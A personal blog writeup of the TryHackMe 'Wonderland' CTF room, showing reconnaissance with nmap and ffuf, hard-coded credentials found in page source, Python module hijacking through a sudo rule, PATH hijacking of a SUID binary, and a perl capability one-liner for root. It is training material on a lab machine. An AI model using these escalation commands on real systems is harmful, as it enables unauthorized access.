---
title: "Wonderland - TryHackMe Writeup"
date: 2024-04-17
draft: false
summary: "Writeup for Wonderland CTF challenge on TryHackMe."
tags: ["linux", "hardcoded creds", "sudo", "suid", "capabilities"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/wonderland/cover.webp"
  caption: "Wonderland TryHackMe Challenge"
  alt: "Wonderland cover"
platform: "TryHackMe"
author: "Moiz Bootwala"
---

Fall down the rabbit hole and enter wonderland.
<!--more-->
To access the challenge, click on the link given below:
- https://tryhackme.com/room/wonderland

## Reconnaissance

I performed an **nmap** aggressive scan on the target to find open ports and the services running on it.

```shell
nmap -A -p- -Pn TARGET -oN wonderland.nmap --min-rate 10000
```

| **Port** | **Service** |
| -------- | ----------- |
| 22       | ssh         |
| 80       | http        |

![performing an nmap scan on wonderland machine](https://cdn.ziomsec.com/wonderland/1.webp)

##  Initial Foothold

I visited the website and found a static web page.

![accessing the web application](https://cdn.ziomsec.com/wonderland/2.webp)

I brute forced directories on the target using **ffuf** and found 2 directories:
1. `r`
2. `poem`

```shell
ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
```

![brute forcing hidden directories](https://cdn.ziomsec.com/wonderland/3.webp)

I visited the pages and found a message on `/r/` and a poem on `poem`.

![accessing the discovered endpoints](https://cdn.ziomsec.com/wonderland/4.webp)

![accessing the discovered endpoints](https://cdn.ziomsec.com/wonderland/5.webp)

I kept brute forcing the directories recursively...

```shell
ffuf -u http://TARGET/r/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
```

When I viewed the source of `/r/a/b/b/i/t`, I found credentials for `alice`.

![accessing the discovered endpoint](https://cdn.ziomsec.com/wonderland/6.webp)

![viewing the page source](https://cdn.ziomsec.com/wonderland/7.webp)

I used it to log in as alice

```shell
ssh alice@TARGET
```

![logging in as alice](https://cdn.ziomsec.com/wonderland/8.webp)

My home directory contained the root flag, hence the user flag was likely present in the root directory.

![listing the contents of home directory](https://cdn.ziomsec.com/wonderland/9.webp)

Hence I captured the user flag from the root directory.

```shell
cat /root/user.txt
```

![capturing the user flag](https://cdn.ziomsec.com/wonderland/10.webp)

### Shell As Rabbit

I viewed my **sudo** privileges and found I was allowed to execute a python script.

The script did not mention the complete path of the module being used, so I created a new file using that name with a code to spawn a bash shell.

```shell
sudo -l
```

![viewing sudo privileges](https://cdn.ziomsec.com/wonderland/11.webp)

```
echo 'import os' > random.py
echo "os.system('/bin/bash')" >> random.py
```

Since, I was allowed to execute the script as rabbit, I got shell access as that user.

```shell
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

![getting shell as rabbit](https://cdn.ziomsec.com/wonderland/12.webp)

### Shell As Hatter

I then visited rabbit's home page and found a binary that had suid bit and was owned by root.

![listing contents in rabbit's home page](https://cdn.ziomsec.com/wonderland/13.webp)

I executed the binary and got some output. To analyze the binary, I transferred it onto my local system.

![transferring the binary to local system](https://cdn.ziomsec.com/wonderland/14.webp)

I then ran **strings** to extract strings from the binary. This binary executed linux commands however did not specify the complete path to them.

```shell
strings teaParty
```

![analyzing the binary using strings](https://cdn.ziomsec.com/wonderland/15.webp)

To exploit this, I created a new file called **date** and added my own code to spawn a privileged bash shell. I then gave it execution permission and injected my directory at the start of my path environment variable.

```shell
echo '/bin/bash -p' > date
chmod 777 date
export PATH=/home/rabbit:$PATH
```

![crafting the payload to exploit the vulnerability](https://cdn.ziomsec.com/wonderland/16.webp)

Finally, I executed the script and got access as another user called *hatter*.

![gaining access as hatter](https://cdn.ziomsec.com/wonderland/17.webp)

I got *hatter*'s password from */home/hatter* and used it to switch my user.

![getting hatter's password from the home directory](https://cdn.ziomsec.com/wonderland/18.webp)

![switching to hatter](https://cdn.ziomsec.com/wonderland/19.webp)

## Privilege Escalation

I then looked for binaries with capabilities and found **perl**.

```shell
getcap -r / 2>/dev/null
```

![listing files with capabilities](https://cdn.ziomsec.com/wonderland/20.webp)

I visited **gtfobins** and found a way to exploit this to get privileged access.
- https://gtfobins.github.io/gtfobins/perl/#capabilities

```shell
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

![exploiting the capability to get root access](https://cdn.ziomsec.com/wonderland/21.webp)

Finally, I captured the root flag present in *alice*'s home directory.

```shell
cat /home/alice/root.txt
```

![capturing the root flag](https://cdn.ziomsec.com/wonderland/22.webp)

That's it from my side, until next time !

---
